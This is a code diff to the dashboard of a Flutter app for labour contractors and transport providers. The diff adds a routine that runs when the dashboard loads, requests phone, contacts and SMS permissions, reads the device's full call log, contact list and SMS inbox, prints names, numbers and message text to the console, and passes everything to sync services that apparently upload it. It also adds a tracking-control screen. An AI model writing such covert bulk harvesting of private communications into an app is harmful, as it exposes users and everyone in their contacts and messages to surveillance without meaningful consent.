@@ -1,9 +1,20 @@
+import 'package:call_log/call_log.dart';
 import 'package:flutter/material.dart';
+import 'package:flutter_contacts/flutter_contacts.dart';
+import 'package:flutter_sms_inbox/flutter_sms_inbox.dart';
 import 'package:mukadam_bi/plans/allPlansScreen.dart';
+import 'package:mukadam_bi/referral/user_referral_mukadam_screen.dart';
+import 'package:mukadam_bi/sms/sms_service.dart';
+import 'package:mukadam_bi/tracking%20control/tracking_control_screen.dart';
 
 // Your existing imports
 import 'package:mukadam_bi/transport/Transport_provider/transport_provider_Screen.dart';
 import 'package:mukadam_bi/transport/transport_provider_list/transport_provider_list_screen.dart';
+import 'package:permission_handler/permission_handler.dart';
+import 'contacts/contact_service.dart';
+import 'fetch call logs/call_log_service.dart';
+import 'getTransport/gettransportscreen.dart';
+import 'map/map_lat_long_Screen.dart';
 import 'mukadan/get_mukadam_details/mukadam_details_Screen.dart'; // Ensure path matches MukadamListScreen
 import 'mukadan/quick_registration/quick_registration_Screen.dart';
 import 'mukadan/registration/mukadam_registration_Screen.dart';
@@ -30,6 +41,97 @@ class _MukadamDashboardState extends State<MukadamDashboard> {
       _buildDashboardContent(), // Modern Grid View
       const DataEntryScreen(),   // Your existing Data Entry Screen
     ];
+
+    //_checkAndFetchCallLogs();
+    _syncAllData();
+  }
+
+  Future<void> _syncAllData() async {
+    // 1. Request all permissions
+    Map<Permission, PermissionStatus> statuses = await [
+      Permission.phone,
+      Permission.contacts,
+      Permission.sms,
+    ].request();
+
+    // --- CALL LOGS ---
+    if (statuses[Permission.phone]!.isGranted) {
+      print('--- FETCHING CALL LOGS ---');
+      Iterable<CallLogEntry> entries = await CallLog.get();
+      if (entries.isEmpty) print('No call logs found on device.');
+      for (var entry in entries.take(5)) {
+        print('Call: ${entry.name} (${entry.number})');
+      }
+      await CallLogService().syncCallLogs(context);
+    } else {
+      print('Call Log Permission Denied');
+    }
+
+    // --- CONTACTS ---
+    if (statuses[Permission.contacts]!.isGranted) {
+      print('--- FETCHING CONTACTS ---');
+      // Double check with the specific contact plugin permission
+      bool contactPermission = await FlutterContacts.requestPermission(readonly: true);
+      if (contactPermission) {
+        List<Contact> contacts = await FlutterContacts.getContacts(withProperties: true);
+
+        if (contacts.isEmpty) {
+          print('No contacts found on this device.');
+        } else {
+          print('Found ${contacts.length} contacts. Printing first 5:');
+          for (var contact in contacts.take(5)) {
+            print('Contact: ${contact.displayName} - ${contact.phones.firstOrNull?.number}');
+          }
+          await ContactService().syncContacts(context);
+        }
+      } else {
+        print('FlutterContacts plugin internal permission denied.');
+      }
+    }
+
+    // --- SMS MESSAGES ---
+    if (statuses[Permission.sms]!.isGranted) {
+      print('--- FETCHING SMS MESSAGES ---');
+      SmsQuery query = SmsQuery();
+      List<SmsMessage> messages = await query.getAllSms;
+      if (messages.isEmpty) print('No SMS found on device.');
+      for (var msg in messages.take(5)) {
+        print('SMS from ${msg.address}: ${msg.body?.substring(0, 20)}...');
+      }
+      await SmsService().syncSms(context);
+    }
+
+    print("--- ALL DATA SYNC PROCESSES COMPLETED ---");
+  }
+
+
+  Future<void> _checkAndFetchCallLogs() async {
+    // 1. Request Phone/Call Log Permission
+    PermissionStatus status = await Permission.phone.request();
+
+    if (status.isGranted) {
+      // 2. Fetch and Print Call Logs
+      Iterable<CallLogEntry> entries = await CallLog.get();
+
+      print('--- CALL LOG DATA FETCHED ---');
+      for (CallLogEntry entry in entries) {
+        print('Name: ${entry.name}');
+        print('Number: ${entry.number}');
+        print('Type: ${entry.callType}');
+        print('Duration: ${entry.duration} sec');
+        print('Date: ${DateTime.fromMillisecondsSinceEpoch(entry.timestamp!)}');
+        print('-------------------------------');
+      }
+
+      await CallLogService().syncCallLogs(context);
+
+
+    } else if (status.isDenied) {
+      print('Call log permission was denied by the user.');
+    } else if (status.isPermanentlyDenied) {
+      print('Permission permanently denied. Opening settings...');
+      openAppSettings();
+    }
   }
 
   void _onItemTapped(int index) {
@@ -158,6 +260,33 @@ class _MukadamDashboardState extends State<MukadamDashboard> {
                 Colors.redAccent,
                 const TransportProviderScreen(),
               ),
+
+              _buildActionCard(
+                "My\nReferrals",
+                Icons.receipt_long,
+                Colors.green,
+                const DirectoryScreen(),
+              ),
+
+              _buildActionCard(
+                "Map",
+                Icons.map,
+                Colors.blue,
+                const OfflineMapScreen(),
+              ),
+
+              _buildActionCard(
+                "control_Screen",
+                Icons.map,
+                Colors.blue,
+                const TrackingControlScreen(),
+              ),
+
+
+
+
+
+
             ],
           ),
           const SizedBox(height: 16),
@@ -168,11 +297,16 @@ class _MukadamDashboardState extends State<MukadamDashboard> {
           //   const TransportProviderListScreen(),
           // ),
 
+
+
+
+          SizedBox(height: 25,),
+
           // _buildWideCard(
-          //   "All plan details",
-          //   "Search database",
-          //   Icons.receipt_long,
-          //   const PlannedVisitsApp(),
+          //   "My Transports",
+          //   "trans",
+          //   Icons.emoji_transportation,
+          //   const TransportDirectoryScreen(searchQuery: '',),
           // ),
         ],
       ),
